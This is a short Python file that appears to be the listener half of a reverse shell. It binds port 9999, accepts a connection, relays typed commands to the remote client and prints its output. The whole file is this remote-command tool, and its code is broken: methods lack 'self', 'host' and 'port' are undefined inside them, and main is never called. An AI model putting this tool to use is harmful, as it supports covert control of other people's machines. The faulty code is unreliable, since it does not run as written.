import socket
import sys

s = None

class Server:
    def __init__(self, host, port):
        self.host = ""
        self.port = 9999

    def create_socket():
        try:
            global s
            s = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))

    def bind_socket():
        try:
            print("Binding the Port: " + str(port))

            s.bind((host, port))
            s.listen(5)
        except socket.error as msg:
            print("Socket binding error: " + str(msg) + "\nRetrying...")

    def socket_accept():
        conn, address = s.accept()
        print("Connection has  been established! | IP " + address[0] + " | Port " + str(address[1]))
        send_commands(conn)
        conn.close()

    def send_commands(conn):
        while True:
            cmd = input()
            if cmd == 'quit':
                conn.close()
                s.close()
                sys.exit()
            command = str.encode(cmd)
            if len(command) > 0:
                conn.send(command)
                client_response = str(conn.recv(1024), "utf-8")
                print(client_response, end="")

    def main():
        create_socket()
        bind_socket()
        socket_accept()
